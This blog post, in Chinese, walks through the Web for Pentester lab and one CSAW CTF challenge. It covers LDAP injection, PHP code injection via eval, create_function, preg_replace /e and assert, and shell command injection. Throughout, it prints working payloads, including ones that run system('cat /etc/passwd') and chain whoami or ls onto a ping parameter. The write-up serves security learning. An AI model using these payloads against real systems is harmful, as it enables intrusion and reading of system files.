<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">



<title>Web_for_pentester-02 | Love to share</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div id="post-toc" class="post-toc">
            <span class="post-toc-title">catalogue</span>
            <div class="post-toc-content">
                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP"><span class="toc-text">LDAP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-1"><span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-2"><span class="toc-text">Example 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#caswCTF—-ldab"><span class="toc-text">caswCTF—-ldab</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#codeinject"><span class="toc-text">codeinject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#example-1"><span class="toc-text">example 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-2"><span class="toc-text">example 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-3"><span class="toc-text">example 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-4"><span class="toc-text">example 4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#commandexec"><span class="toc-text">commandexec</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#example1"><span class="toc-text">example1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-2-1"><span class="toc-text">example 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-3-1"><span class="toc-text">example 3</span></a></li></ol></li></ol>
            </div>
        </div>
    
    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Web_for_pentester-02</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">October 13, 2018&nbsp;&nbsp;22:45:18</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <section class="post-content">
            <p>算是把这个靶场都玩完了吧.</p>
<p>原本对LDAP,代码注入,命令执行不是特别熟悉.通过这个算是学习到了一些基本的知识点.还算是有收获吧</p>
<a id="more"></a>

<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://www.freebuf.com/articles/rookie/170322.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/rookie/170322.html</a></p>
<p>写的很详细.</p>
<p><img src="Web-for-pentester-02/1.png" alt></p>
<p>大概意思就是ldap匿名认证的一个缺陷吧.利用空值访问两次就可以得到认证成功的意思.</p>
<p>我对此处的利用不太感冒(ps:是太菜了看得有点晕)..简单的摘抄一下..</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用用户名和密码连接到LDAP服务器。在这情况下，LDAP不会对您的身份进行验证，因为凭据无效，但是，某些LDAP服务器授权NULL绑定，结合上面的两次绑定方法，我们知道，如果发送空值，则LDAP服务器将会继续绑定连接，并且php代码会认为平局是正确的，所以我们尝试使用空值.</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.199.110/ldap/example1.php?username=&amp;password=  #可以看还是显示认证失败</span><br></pre></td></tr></table></figure>

<p> 那我们把参数全部去掉然后尝试一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.199.110/ldap/example1.php #页面显示认证成功</span><br></pre></td></tr></table></figure>

<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><p>这里就和sql注入有些像了.</p>
<p><img src="Web-for-pentester-02/2.png" alt></p>
<p>基本的ldap知识</p>
<p><a href="https://zhhhy.github.io/2018/09/21/LDAP/" target="_blank" rel="noopener">https://zhhhy.github.io/2018/09/21/LDAP/</a></p>
<p>了解基础知识以后就可以发现.这是个典型的登录验证的情况.查看源码</p>
<p>发现只要构造</p>
<p>闭合前面的括号的语句就可以了</p>
<p>例如 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*))%00</span><br></pre></td></tr></table></figure>

<p>还可以用以管理员身份登录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a*))%00</span><br></pre></td></tr></table></figure>

<p>这种闭合前面再加上(cn=*)代替password一项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">)(cn=*))%00&amp;password=hacker</span><br></pre></td></tr></table></figure>

<h4 id="caswCTF—-ldab"><a href="#caswCTF—-ldab" class="headerlink" title="caswCTF—-ldab"></a>caswCTF—-ldab</h4><p> <a href="http://web.chal.csaw.io:8080/" target="_blank" rel="noopener">http://web.chal.csaw.io:8080/</a></p>
<p>至于是几个括号..我是一个一个加的试出来的</p>
<p>首先先是输入 *   发现会打印出所有人的信息但是没有flag</p>
<p>然后加一个括号..页面回显错误</p>
<p>继续加并且用%00注释掉后面原本的语句</p>
<p>在加了第三个括号的时候发现输出了flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;http://web.chal.csaw.io:8080/index.php?search=*))(cn=*))%00&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*)))%00</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.chal.csaw.io:8080/index.php?search=f*)))%00</span><br></pre></td></tr></table></figure>

<p>我查看了别人的题解..</p>
<p>payload是 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*))(|(ou=*</span><br></pre></td></tr></table></figure>

<p>仔细的猜想了一下<code>. 
如果用</code>* <code>表示查询所有的元素</code>,<code>那么应该会把</code>flag<code>输出出来</code>.. <code>可是并没有</code>.
也就是说<code>,flag</code>一项被过滤了<code>.</code>那么用<code>%</code>00<code>注释以后过滤的语句就被注释掉了</code>.
那么为什么题解里的<code>payload</code>是这样的呢<br>为了保证的语法的正确性<code>,</code>我们需要用<code>(|(ou=*</code>来闭合后边多余的括号<code>.
并且把第二个语句用</code>or<code>语句闭合成正确语句
但是</code>! <code>这里是个重点</code>.
LDAP<code>只会执行左边开始的第一个</code>语句<code>.
也就是我们后边的语句不执行</code>,<code>只执行了前面于是使得</code>flag逃脱了过滤</p>
<p>当我猜想完这些的时候<code>..</code>再仔细看了一下<code>..</code>这题有<code>3</code>个括号<code>..</code>也就是说<code>,</code>这只有一个语句<code>!!</code>也就是后半部分为了闭合后部分的语句并且用<code>or</code>使后面语句成真<code>...</code>大概就是这样吧</p>
<h2 id="codeinject"><a href="#codeinject" class="headerlink" title="codeinject"></a>codeinject</h2><h3 id="example-1"><a href="#example-1" class="headerlink" title="example 1"></a>example 1</h3><p>查看源码发现完全没有过滤..</p>
<p><img src="Web-for-pentester-02/3.png" alt></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“;phpinfo();%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>闭合前面的引号和封号.注释掉后面的引号封号.就可以了..</p>
<p>还有利用字符串拼接</p>
<p>因为eval函数会把传入的字符串当作php代码执行,于是..就可以执行任意代码了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=%<span class="number">22.</span>system(%<span class="number">27</span>cat%<span class="number">20</span>/et/passwd%<span class="number">27</span>);%<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><img src="Web-for-pentester-02/4.png" alt></p>
<h3 id="example-2"><a href="#example-2" class="headerlink" title="example 2"></a>example 2</h3><p><a href="http://www.freebuf.com/sectool/168653.html&gt;" target="_blank" rel="noopener">http://www.freebuf.com/sectool/168653.html&gt;</a></p>
<p>问题在于这句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort($users, create_function(<span class="string">'$a, $b'</span>, <span class="string">'return strcmp($a→'</span>.$order.<span class="string">',$b→'</span>.$order.<span class="string">');'</span>));</span><br></pre></td></tr></table></figure>

<p>usort() 使用用户自定义的比较函数对数组进行排序。语法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort(<span class="keyword">array</span>,myfunction);</span><br></pre></td></tr></table></figure>

<p>也就是后面的<code>myfunction</code>自定义函数是可以执行的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$a, $b'</span>, <span class="string">'return strcmp($a-&gt;'</span>.$order.<span class="string">',$b-&gt;'</span>.$order.<span class="string">');</span></span><br></pre></td></tr></table></figure>

<p> order参数可控..假如我们输入的是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order);&#125;<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p> 则会闭合成  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$a, $b'</span>, <span class="string">'return strcmp($a→'</span>.$order.<span class="string">',$b→order);&#125;//);</span></span><br></pre></td></tr></table></figure>

<p> 花括号是为了逃出函数体</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.43.217/codeexec/example2.php?order=id);&#125;%20phpinfo();//</span></span><br></pre></td></tr></table></figure>

<p> 成功执行了phpinfor();</p>
<p><img src="Web-for-pentester-02/5.png" alt></p>
<p> 当然还可以执行别的命令</p>
<p> 例如 查看目录文件夹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order=id);&#125;%<span class="number">20</span>print_r(scandir(%<span class="number">27.</span>./%<span class="number">27</span>));<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p><img src="Web-for-pentester-02/6.png" alt></p>
<p>读取etc/passwd文件 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order=id);&#125;%<span class="number">20</span>print_r(system(%<span class="number">27</span>cat%<span class="number">20.</span>./../../../../../../etc/passwd%<span class="number">27</span>));<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p><img src="Web-for-pentester-02/7.png" alt></p>
<h3 id="example-3"><a href="#example-3" class="headerlink" title="example 3"></a>example 3</h3><p> 这部分算是从零开始学习吧</p>
<p> 问题出在这</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace($_GET[<span class="string">"pattern"</span>], $_GET[<span class="string">"new"</span>], $_GET[<span class="string">"base"</span>]);</span><br></pre></td></tr></table></figure>

<p> 首先了解一下preg_replace()这个函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = <span class="number">-1</span> [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>

<p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p>
<p> 参数说明：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line"></span><br><span class="line">$replacement: 用于替换的字符串或字符串数组。</span><br><span class="line"></span><br><span class="line">$subject: 要搜索替换的目标字符串或字符串数组。</span><br><span class="line"></span><br><span class="line">$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是<span class="number">-1</span>（无限制）。</span><br><span class="line"></span><br><span class="line">$count: 可选，为替换执行的次数。</span><br></pre></td></tr></table></figure>

<p>到这里就可以知道一下代码的意思是,传入一个搜索的模式pattern.一个用于替换的字符串new,一个被搜索替换的字符串   base </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace($_GET[<span class="string">"pattern"</span>], $_GET[<span class="string">"new"</span>], $_GET[<span class="string">"base"</span>]);</span><br></pre></td></tr></table></figure>

<p> 知识点来了.</p>
<p>当在pattern中有subject(base)所能匹配的字符串就可以利用/e这个修正复将replacement(new)这个字符串当作php代码执行</p>
<p> 于是payload如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>=phpinfo();&amp;pattern=/lamer/e&amp;base=Hello%<span class="number">20</span>lamer</span><br></pre></td></tr></table></figure>

<p><img src="Web-for-pentester-02/8.png" alt></p>
<p>不太懂这样的场景会在什么情况下出现.记录一下</p>
<h3 id="example-4"><a href="#example-4" class="headerlink" title="example 4"></a>example 4</h3><p>这个似乎..我个人感觉比example3好理解多了..<br>主要是一个assert()可以将字符串当成php代码执行<br>看到assert函数就要警惕了，和eval函数都是一句话后门程序。区别在于eval函数中参数是字符串，assert函数中的参数是表达式或者是函数<br>题目里的问题代码关键点在这</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(trim(<span class="string">"'"</span>.$_GET[<span class="string">'name'</span>].<span class="string">"'"</span>));</span><br></pre></td></tr></table></figure>

<p> trim()函数去除参数两边的空格,并且使用单引号包裹.<br>于是我的payload如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=%<span class="number">27.</span>print_r(system(%<span class="number">27</span>cat%<span class="number">20.</span>./../../../../../../etc/passwd%<span class="number">27</span>));%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>用单引号闭合前面的单引号再用 . 来拼接我们的恶意代码最后用%23把后面的单引号给注释掉<br>网上给的payload如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=hacker<span class="string">'.phpinfo().'</span></span><br></pre></td></tr></table></figure>

<p>用单引号闭合前后的引号</p>
<h2 id="commandexec"><a href="#commandexec" class="headerlink" title="commandexec"></a>commandexec</h2><h3 id="example1"><a href="#example1" class="headerlink" title="example1"></a>example1</h3><p>对输入的参数没有过滤<br><a href="http://192.168.43.217/commandexec/example1.php?ip=127.0.0.1;ls" target="_blank" rel="noopener">http://192.168.43.217/commandexec/example1.php?ip=127.0.0.1;ls</a></p>
<p>或是这种方式<br>127.0.0.1|ls</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">windows支持：</span><br><span class="line"></span><br><span class="line">|           ping 127.0.0.1|whoami           ||              ping  2 || whoami （哪条名令为真执行那条）</span><br><span class="line"></span><br><span class="line">&amp;  &amp;&amp;   ping 127.0.0.1&amp;&amp;whoami</span><br><span class="line"></span><br><span class="line">Linux支持：</span><br><span class="line"></span><br><span class="line">；      127.0.0.1;whoami  </span><br><span class="line"></span><br><span class="line">|         127.0.0.1|whoami                    11    1||whoami  （哪条名令为真执行那条）</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span># &amp;&amp;     127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>

<p>回显如下—–列出了目录</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.044 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.033 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 999ms</span><br><span class="line">rtt min/avg/max/mdev = 0.033/0.038/0.044/0.008 ms</span><br><span class="line">example1.php</span><br><span class="line">example2.php</span><br><span class="line">example3.php</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure>

<p>当然能做的远远不只是列目录</p>
<h3 id="example-2-1"><a href="#example-2-1" class="headerlink" title="example 2"></a>example 2</h3><p>从后端来看<br>利用preg_match函数用正则对数据限制了.<br>preg_match是可绕过的</p>
<p> 1.如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束<code>(^</code>和 <code>$)</code>，则可以存在绕过的问题</p>
<p> 2.或者正则写的不够完善</p>
<p> 这里就属于第二种<br> 在源码里可以看到 正则是以/m结尾的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正则 /m 是匹配换行符,也就是说它只判断换行符前的语句是否合法.</span><br></pre></td></tr></table></figure>

<p>于是%0a就闪亮登场</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.43.217/commandexec/example2.php?ip=127.0.0.1%0als</span></span><br></pre></td></tr></table></figure>

<h3 id="example-3-1"><a href="#example-3-1" class="headerlink" title="example 3"></a>example 3</h3><p>发现只要不符合正则就会重定向<br>抓包发送以后</p>
<p><img src="Web-for-pentester-02/9.ong.png" alt></p>
<p>就能拿到了???<br>这边原理不是很懂,记录一下知识点当<br>有302重定向的时候可以利用抓包来逃脱</p>

        </section>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>zhhhy</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://yoursite.com/2018/10/13/Web-for-pentester-02/">http://yoursite.com/2018/10/13/Web-for-pentester-02/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Solgan:</span>
                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2018/10/14/RCE/">RCE</a>
            
            
            <a class="next" rel="next" href="/2018/10/12/web-for-pentester/">Web_for_pentester-01</a>
            
        </section>


    </article>
</div>
        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>
    </div>
</body>
</html>